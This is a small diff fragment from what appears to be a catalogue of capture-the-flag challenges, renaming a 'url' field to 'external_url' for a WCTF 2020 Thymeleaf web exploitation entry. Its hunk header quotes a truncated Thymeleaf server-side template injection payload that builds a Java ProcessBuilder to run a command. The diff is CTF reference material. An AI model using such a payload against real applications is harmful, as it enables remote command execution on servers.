@@ -16,6 +16,6 @@ thymeleaf 3.0.15: __*{new.java.lang.String(new.java.lang.ProcessBuilder('/readfl
 
 
 "
-url: "https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf"
+external_url: "https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf"
 category: "Web Exploitation"
 ---
